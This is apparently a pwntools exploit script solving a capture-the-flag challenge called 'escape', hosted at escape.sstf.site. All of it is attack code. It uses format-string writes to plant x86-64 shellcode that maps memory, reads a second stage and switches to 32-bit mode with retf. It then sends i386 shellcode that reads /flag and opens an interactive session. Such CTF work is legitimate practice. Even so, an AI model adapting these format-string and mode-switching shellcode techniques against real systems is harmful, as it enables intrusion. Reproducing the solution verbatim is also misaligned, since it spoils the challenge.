#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./escape")


def start(argv=[], *a, **kw):
    # nc escape.sstf.site 5051
    host = args.HOST or 'escape.sstf.site'
    port = int(args.PORT or 5051)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}


def exec_fmt_1(payload):
    p = start()
    p.sendline(payload)
    return p.recvall(timeout=1)


def exec_fmt_2(payload):
    p = start()
    p.sendline(b"abcd")
    p.recvline()
    p.sendline(payload)
    return p.recvall(timeout=1)


# https://osilayer8.makerforce.io/crossctf-quals2018/pwn/impossible_shellcoding/
mmap = '''
xor rax, rax
mov al, 9
mov rdi, 0x602000
mov rsi, 0x1000
mov rdx, 7
mov r10, 0x32
mov r8, 0xffffffff
mov r9, 0
syscall'''

read = '''
mov rax, 0
xor rdi, rdi
mov rsi, 0x602190
mov rdx, 200
syscall'''

retf = '''
xor rsp, rsp
mov esp, 0x602160
mov DWORD PTR [esp+4], 0x23
mov DWORD PTR [esp], 0x602190
retf
'''

sc = asm(mmap + read + retf)

# fmt_str = FmtStr(execute_fmt=exec_fmt_1)
# fmt_str = FmtStr(execute_fmt=exec_fmt_2)

io = start()
offset = 8  # fmt_str.offset

context.clear()
context.arch = "i386"
scraft = shellcraft.i386
final_sc = asm(
    "mov esi, 1" +
    scraft.linux.readfile("/flag")
)

context.clear()
context.binary = elf

sc_addr = 0x50510000

for i in range(0, len(sc)):
    w = {sc_addr + i: sc[i]}
    payload = fmtstr_payload(offset, w)
    io.sendlineafter(b"Enter: \n", payload)


io.sendlineafter(b"Enter: \n", b"done")
pause(1)
context.log_level = "DEBUG"
io.send(final_sc)
io.interactive()
